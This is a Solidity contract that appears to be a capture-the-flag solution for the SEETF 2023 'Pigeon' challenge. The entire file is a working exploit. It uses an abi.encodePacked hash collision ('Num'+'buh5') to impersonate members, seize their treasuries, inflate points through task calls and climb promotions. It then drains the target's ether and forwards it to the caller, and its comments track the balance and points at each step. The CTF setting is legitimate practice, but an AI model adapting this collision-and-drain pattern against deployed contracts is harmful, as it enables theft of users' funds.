// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.17;
import "./Pigeon.sol";

contract PigeonAttackSEETF23 {
    function attack(address target) public {
        PigeonSEETF23 p = PigeonSEETF23(target);
        p.becomeAPigeon("Num", "buh5");
        p.flyAway(keccak256(abi.encodePacked("Num", "buh5")), 0);    // get Numbuh5's treusury(5 eth), pigeon -> 25 eth

        p.task(keccak256(abi.encodePacked("Num", "buh5")), target, target.balance);  // points -> 25
        p.promotion(keccak256(abi.encodePacked("Num", "buh5")), 1, "Num", "buh3");  // points -> 0
        p.flyAway(keccak256(abi.encodePacked("Num", "buh3")), 1);   // get Numbuh3's treusury(10 eth), pigeon -> 15 eth
        
        p.task(keccak256(abi.encodePacked("Num", "buh3")), target, target.balance);  // points -> 15
        p.promotion(keccak256(abi.encodePacked("Num", "buh3")), 2, "Num", "buh1");
        p.flyAway(keccak256(abi.encodePacked("Num", "buh1")), 2);
        
        (bool success, )  = address(msg.sender).call{value: address(this).balance}("");
        require(success);
    }    

    receive() external payable {}
}
